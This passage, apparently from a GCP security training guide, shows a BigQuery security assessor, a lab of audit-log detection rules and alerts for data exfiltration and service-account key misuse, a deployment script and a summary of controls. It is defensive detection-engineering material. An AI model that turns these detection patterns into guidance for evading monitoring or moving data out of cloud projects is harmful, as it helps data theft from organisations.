                severity="HIGH",
                category="MONITORING",
                title="BigQuery Data Access audit logs not enabled",
                description=(
                    "Data Access audit logs are not enabled for BigQuery. "
                    "Query executions and data reads are not being logged."
                ),
                resource=f"projects/{self.project_id}",
                evidence="No DATA_READ/DATA_WRITE audit config for bigquery",
                remediation=(
                    "Enable Data Access audit logs for "
                    "bigquery.googleapis.com (DATA_READ + DATA_WRITE)"
                ),
                cwe="CWE-778",
                cvss=6.5,
            ))

    def assess_network_controls(self):
        """Check VPC Service Controls status."""
        # This requires org-level access
        try:
            from google.cloud import accesscontextmanager_v1
            client = accesscontextmanager_v1.AccessContextManagerClient()

            # Check if project is in any perimeter
            # (simplified — real check requires org-level permissions)
            self.findings.append(Finding(
                severity="INFO",
                category="NETWORK",
                title="VPC Service Controls assessment",
                description=(
                    "Verify project is within a VPC Service Controls perimeter "
                    "that restricts bigquery.googleapis.com egress."
                ),
                resource=f"projects/{self.project_id}",
                evidence="Manual verification required",
                remediation=(
                    "Place data projects within VPC-SC perimeter with "
                    "restricted services including bigquery.googleapis.com"
                ),
            ))
        except Exception:
            pass

    def assess_data_classification(self):
        """Check if data classification (policy tags) is applied."""
        datasets = list(self.bq_client.list_datasets())
        unclassified_tables = []

        for dataset_listing in datasets:
            tables = list(
                self.bq_client.list_tables(dataset_listing.dataset_id)
            )
            for table_listing in tables[:10]:  # Sample first 10
                table = self.bq_client.get_table(table_listing)
                has_policy_tags = any(
                    field.policy_tags
                    for field in table.schema
                    if field.policy_tags and field.policy_tags.names
                )
                if not has_policy_tags:
                    unclassified_tables.append(
                        f"{dataset_listing.dataset_id}.{table_listing.table_id}"
                    )

        if unclassified_tables:
            self.findings.append(Finding(
                severity="MEDIUM",
                category="DATA_GOVERNANCE",
                title=f"{len(unclassified_tables)} tables without policy tags",
                description=(
                    "Tables without column-level security (policy tags) "
                    "cannot enforce fine-grained access control."
                ),
                resource=f"projects/{self.project_id}",
                evidence=f"samples: {unclassified_tables[:5]}",
                remediation=(
                    "Apply Data Catalog policy tags to columns containing "
                    "PII or sensitive data. Use DLP to identify columns."
                ),
                cwe="CWE-284",
                cvss=5.0,
            ))

    def generate_report(self) -> str:
        """Generate assessment report."""
        report = {
            "assessment_date": datetime.now(timezone.utc).isoformat(),
            "project": self.project_id,
            "summary": {
                "total_findings": len(self.findings),
                "critical": sum(1 for f in self.findings if f.severity == "CRITICAL"),
                "high": sum(1 for f in self.findings if f.severity == "HIGH"),
                "medium": sum(1 for f in self.findings if f.severity == "MEDIUM"),
                "low": sum(1 for f in self.findings if f.severity == "LOW"),
                "info": sum(1 for f in self.findings if f.severity == "INFO"),
            },
            "findings": [vars(f) for f in self.findings],
        }
        return json.dumps(report, indent=2, default=str)


# --- Execution ---

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 2:
        print("Usage: python assess_bigquery.py <project_id>")
        sys.exit(1)

    project_id = sys.argv[1]
    assessor = BigQuerySecurityAssessor(project_id)
    assessor.run_full_assessment()

    report = assessor.generate_report()
    print(report)

    # Exit with non-zero if critical findings
    critical_count = sum(
        1 for f in assessor.findings if f.severity == "CRITICAL"
    )
    sys.exit(1 if critical_count > 0 else 0)
```

### Lab 4: Audit-Based Detection for Data Exfiltration

**Objective:** Create detection rules that identify data exfiltration attempts using Cloud Audit Logs.

```python
#!/usr/bin/env python3
"""
Lab 4: Detection Engineering for GCP Data Exfiltration
Build and deploy detection rules using audit logs.
"""

from google.cloud import logging_v2, bigquery, monitoring_v3
from google.protobuf import duration_pb2
from datetime import datetime, timedelta, timezone
import json


class ExfiltrationDetector:
    """Detection rules for GCP data exfiltration patterns."""

    def __init__(self, project_id: str):
        self.project_id = project_id
        self.logging_client = logging_v2.Client(project=project_id)
        self.bq_client = bigquery.Client(project=project_id)

    def detect_large_export(self, hours_back: int = 24) -> list[dict]:
        """Detect large data exports from BigQuery."""
        query = f"""
        SELECT
          protopayload_auditlog.authenticationInfo.principalEmail AS principal,
          protopayload_auditlog.methodName AS method,
          protopayload_auditlog.servicedata_v1_bigquery.jobCompletedEvent.job.jobConfiguration.extract.destinationUris AS dest_uris,
          protopayload_auditlog.servicedata_v1_bigquery.jobCompletedEvent.job.jobStatistics.totalProcessedBytes AS bytes_processed,
          timestamp,
          resource.labels.project_id AS source_project,
        FROM `{self.project_id}.audit_logs.cloudaudit_googleapis_com_data_access`
        WHERE
          timestamp > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL {hours_back} HOUR)
          AND protopayload_auditlog.methodName = 'jobservice.jobcompleted'
          AND protopayload_auditlog.servicedata_v1_bigquery.jobCompletedEvent.job.jobConfiguration.extract IS NOT NULL
          AND CAST(protopayload_auditlog.servicedata_v1_bigquery.jobCompletedEvent.job.jobStatistics.totalProcessedBytes AS INT64) > 1073741824
        ORDER BY bytes_processed DESC
        """

        alerts = []
        for row in self.bq_client.query(query).result():
            alerts.append({
                "detection_rule": "LARGE_BQ_EXPORT",
                "severity": "HIGH",
                "timestamp": row.timestamp.isoformat(),
                "principal": row.principal,
                "bytes_exported": row.bytes_processed,
                "destinations": row.dest_uris,
                "source_project": row.source_project,
            })
        return alerts

    def detect_unusual_access_patterns(self, hours_back: int = 24) -> list[dict]:
        """Detect users accessing datasets they never accessed before."""
        query = f"""
        WITH recent_access AS (
          SELECT DISTINCT
            protopayload_auditlog.authenticationInfo.principalEmail AS principal,
            resource.labels.dataset_id AS dataset,
            DATE(timestamp) AS access_date,
          FROM `{self.project_id}.audit_logs.cloudaudit_googleapis_com_data_access`
          WHERE
            timestamp > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL {hours_back} HOUR)
            AND protopayload_auditlog.serviceName = 'bigquery.googleapis.com'
            AND protopayload_auditlog.methodName LIKE 'tabledata%'
        ),
        historical_access AS (
          SELECT DISTINCT
            protopayload_auditlog.authenticationInfo.principalEmail AS principal,
            resource.labels.dataset_id AS dataset,
          FROM `{self.project_id}.audit_logs.cloudaudit_googleapis_com_data_access`
          WHERE
            timestamp BETWEEN
              TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY)
              AND TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL {hours_back} HOUR)
            AND protopayload_auditlog.serviceName = 'bigquery.googleapis.com'
        )
        SELECT
          r.principal,
          r.dataset,
          r.access_date,
        FROM recent_access r
        LEFT JOIN historical_access h
          ON r.principal = h.principal AND r.dataset = h.dataset
        WHERE h.principal IS NULL
        """

        alerts = []
        for row in self.bq_client.query(query).result():
            alerts.append({
                "detection_rule": "NEW_DATASET_ACCESS",
                "severity": "MEDIUM",
                "timestamp": row.access_date.isoformat(),
                "principal": row.principal,
                "dataset": row.dataset,
                "note": "First-time access to this dataset in 30 days",
            })
        return alerts

    def detect_service_account_key_usage(self, hours_back: int = 24) -> list[dict]:
        """Detect SA key usage for BigQuery access (prefer Workload Identity)."""
        query = f"""
        SELECT
          protopayload_auditlog.authenticationInfo.principalEmail AS sa_email,
          protopayload_auditlog.authenticationInfo.serviceAccountKeyName AS key_name,
          protopayload_auditlog.methodName AS method,
          COUNT(*) AS call_count,
          MIN(timestamp) AS first_seen,
          MAX(timestamp) AS last_seen,
        FROM `{self.project_id}.audit_logs.cloudaudit_googleapis_com_data_access`
        WHERE
          timestamp > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL {hours_back} HOUR)
          AND protopayload_auditlog.authenticationInfo.serviceAccountKeyName IS NOT NULL
          AND protopayload_auditlog.authenticationInfo.serviceAccountKeyName != ''
          AND protopayload_auditlog.serviceName = 'bigquery.googleapis.com'
        GROUP BY 1, 2, 3
        ORDER BY call_count DESC
        """

        alerts = []
        for row in self.bq_client.query(query).result():
            alerts.append({
                "detection_rule": "SA_KEY_BQ_ACCESS",
                "severity": "MEDIUM",
                "sa_email": row.sa_email,
                "key_name": row.key_name,
                "method": row.method,
                "call_count": row.call_count,
                "period": f"{row.first_seen.isoformat()} to {row.last_seen.isoformat()}",
                "note": "SA key used for BQ access — prefer Workload Identity",
            })
        return alerts

    def detect_cross_project_data_copy(self, hours_back: int = 24) -> list[dict]:
        """Detect data being copied to external projects."""
        query = f"""
        SELECT
          protopayload_auditlog.authenticationInfo.principalEmail AS principal,
          protopayload_auditlog.methodName AS method,
          JSON_EXTRACT_SCALAR(
            protopayload_auditlog.servicedata_v1_bigquery.jobCompletedEvent.job.jobConfiguration.query.query,
            '$'
          ) AS query_text,
          protopayload_auditlog.servicedata_v1_bigquery.jobCompletedEvent.job.jobConfiguration.query.destinationTable.projectId AS dest_project,
          protopayload_auditlog.servicedata_v1_bigquery.jobCompletedEvent.job.jobConfiguration.query.destinationTable.datasetId AS dest_dataset,
          timestamp,
        FROM `{self.project_id}.audit_logs.cloudaudit_googleapis_com_data_access`
        WHERE
          timestamp > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL {hours_back} HOUR)
          AND protopayload_auditlog.methodName = 'jobservice.jobcompleted'
          AND protopayload_auditlog.servicedata_v1_bigquery.jobCompletedEvent.job.jobConfiguration.query.destinationTable.projectId != '{self.project_id}'
          AND protopayload_auditlog.servicedata_v1_bigquery.jobCompletedEvent.job.jobConfiguration.query.destinationTable.projectId IS NOT NULL
        ORDER BY timestamp DESC
        """

        alerts = []
        for row in self.bq_client.query(query).result():
            alerts.append({
                "detection_rule": "CROSS_PROJECT_COPY",
                "severity": "HIGH",
                "timestamp": row.timestamp.isoformat(),
                "principal": row.principal,
                "dest_project": row.dest_project,
                "dest_dataset": row.dest_dataset,
                "query_prefix": (row.query_text or "")[:200],
            })
        return alerts

    def deploy_log_based_alerts(self):
        """Deploy Cloud Monitoring log-based alerting policies."""
        monitoring_client = monitoring_v3.AlertPolicyServiceClient()
        project_name = f"projects/{self.project_id}"

        # Alert 1: BigQuery EXPORT DATA
        export_alert = monitoring_v3.AlertPolicy(
            display_name="[SEC] BigQuery Data Export Detected",
            conditions=[
                monitoring_v3.AlertPolicy.Condition(
                    display_name="EXPORT DATA in audit log",
                    condition_matched_log=monitoring_v3.AlertPolicy.Condition.LogMatch(
                        filter=(
                            'resource.type="bigquery_project" '
                            'protoPayload.methodName="jobservice.jobcompleted" '
                            'protoPayload.serviceData.jobCompletedEvent.job.'
                            'jobConfiguration.extract.destinationUris:*'
                        ),
                    ),
                )
            ],
            combiner=monitoring_v3.AlertPolicy.ConditionCombinerType.OR,
            notification_channels=[],  # Add notification channel IDs
            alert_strategy=monitoring_v3.AlertPolicy.AlertStrategy(
                notification_rate_limit=monitoring_v3.AlertPolicy.AlertStrategy.NotificationRateLimit(
                    period=duration_pb2.Duration(seconds=300),
                ),
            ),
        )

        # Alert 2: IAM policy change on data resources
        iam_alert = monitoring_v3.AlertPolicy(
            display_name="[SEC] Data Resource IAM Change",
            conditions=[
                monitoring_v3.AlertPolicy.Condition(
                    display_name="IAM change on BigQuery/Storage",
                    condition_matched_log=monitoring_v3.AlertPolicy.Condition.LogMatch(
                        filter=(
                            'protoPayload.methodName=('
                            '"google.iam.v1.IAMPolicy.SetIamPolicy" OR '
                            '"SetIamPolicy") '
                            'AND (resource.type="bigquery_dataset" OR '
                            'resource.type="gcs_bucket")'
                        ),
                    ),
                )
            ],
            combiner=monitoring_v3.AlertPolicy.ConditionCombinerType.OR,
        )

        # Alert 3: Service account key creation
        sa_key_alert = monitoring_v3.AlertPolicy(
            display_name="[SEC] Service Account Key Created",
            conditions=[
                monitoring_v3.AlertPolicy.Condition(
                    display_name="SA key creation",
                    condition_matched_log=monitoring_v3.AlertPolicy.Condition.LogMatch(
                        filter=(
                            'protoPayload.methodName='
                            '"google.iam.admin.v1.CreateServiceAccountKey"'
                        ),
                    ),
                )
            ],
            combiner=monitoring_v3.AlertPolicy.ConditionCombinerType.OR,
        )

        for alert in [export_alert, iam_alert, sa_key_alert]:
            created = monitoring_client.create_alert_policy(
                name=project_name, alert_policy=alert
            )
            print(f"Created alert: {created.display_name} -> {created.name}")


# --- Deployment Script ---

DEPLOY_COMMANDS = """
#!/bin/bash
# Deploy detection infrastructure

PROJECT_ID="${1:?Usage: deploy.sh PROJECT_ID}"

# 1. Create audit log sink to BigQuery (for historical analysis)
gcloud logging sinks create audit-to-bq \\
  "bigquery.googleapis.com/projects/${PROJECT_ID}/datasets/audit_logs" \\
  --project="${PROJECT_ID}" \\
  --log-filter='logName:"cloudaudit.googleapis.com"' \\
  --use-partitioned-tables

# 2. Grant sink writer access
SINK_SA=$(gcloud logging sinks describe audit-to-bq \\
  --project="${PROJECT_ID}" \\
  --format="value(writerIdentity)")

bq mk --dataset \\
  --location=US \\
  --description="Audit logs for security analysis" \\
  "${PROJECT_ID}:audit_logs"

# Grant writer access to the dataset
bq add-iam-policy-binding \\
  --project="${PROJECT_ID}" \\
  --dataset=audit_logs \\
  --member="${SINK_SA}" \\
  --role=roles/bigquery.dataEditor

# 3. Create scheduled query for daily detection
bq query --use_legacy_sql=false --schedule="every 24 hours" \\
  --display_name="Daily Exfiltration Detection" \\
  --destination_table="${PROJECT_ID}:security_findings.daily_detections" \\
  --replace \\
  "SELECT ... (detection query) ..."

# 4. Enable Data Access audit logs
gcloud projects set-iam-policy "${PROJECT_ID}" <(
  gcloud projects get-iam-policy "${PROJECT_ID}" --format=json | \\
  jq '.auditConfigs += [{
    "service": "bigquery.googleapis.com",
    "auditLogConfigs": [
      {"logType": "DATA_READ"},
      {"logType": "DATA_WRITE"}
    ]
  }, {
    "service": "storage.googleapis.com",
    "auditLogConfigs": [
      {"logType": "DATA_READ"},
      {"logType": "DATA_WRITE"}
    ]
  }]'
)

echo "Detection infrastructure deployed."
echo "Run the Python assessor for ongoing monitoring."
"""


if __name__ == "__main__":
    import sys

    project_id = sys.argv[1] if len(sys.argv) > 1 else "my-project"
    detector = ExfiltrationDetector(project_id)

    print("=== Running Detection Rules ===")
    print("\n--- Large Exports ---")
    for alert in detector.detect_large_export():
        print(json.dumps(alert, indent=2))

    print("\n--- Unusual Access ---")
    for alert in detector.detect_unusual_access_patterns():
        print(json.dumps(alert, indent=2))

    print("\n--- SA Key Usage ---")
    for alert in detector.detect_service_account_key_usage():
        print(json.dumps(alert, indent=2))

    print("\n--- Cross-Project Copy ---")
    for alert in detector.detect_cross_project_data_copy():
        print(json.dumps(alert, indent=2))

    print("\n=== Deploying Alerting Policies ===")
    detector.deploy_log_based_alerts()
```

---

## Summary of Key Security Controls

| Layer | Control | Implementation |
|-------|---------|----------------|
| Identity | Least-privilege IAM | Dataset-level bindings, custom roles |
| Network | VPC Service Controls | Perimeter around data projects |
| Encryption | CMEK with HSM | Per-service keys, 90-day rotation |
| Classification | Policy tags + DLP | Column-level security, automated scanning |
| Monitoring | Audit logs + alerting | Data Access logs, SIEM integration |
| Governance | Dataplex + Data Catalog | Zones, quality rules, tag templates |
| Exfiltration | Org policies + VPC-SC | Export restrictions, egress policies |
| Detection | Log analytics | Behavioral baselines, anomaly detection |

**Critical org policies for data platform security:**

1. `constraints/bigquery.restrictExportDataConfig` — limit export destinations
2. `constraints/bigquery.requireCmek` — enforce customer-managed keys
3. `constraints/storage.publicAccessPrevention` — block public buckets
4. `constraints/iam.disableServiceAccountKeyCreation` — force Workload Identity
5. `constraints/compute.restrictVpcPeering` — limit network connectivity
6. `constraints/gcp.restrictServiceUsage` — limit available APIs

---

## References

- Google Cloud Architecture Framework: Security (cloud.google.com/architecture/framework/security)
- BigQuery documentation: Controlling access to datasets (cloud.google.com/bigquery/docs/dataset-access-controls)
- VPC Service Controls documentation (cloud.google.com/vpc-service-controls/docs/overview)
- Cloud DLP documentation (cloud.google.com/sensitive-data-protection/docs)
- Apache Beam Programming Guide (beam.apache.org/documentation/programming-guide)
- Dataplex documentation (cloud.google.com/dataplex/docs)
- Cloud Audit Logs documentation (cloud.google.com/logging/docs/audit)
- GCP Security Best Practices (cloud.google.com/security/best-practices)
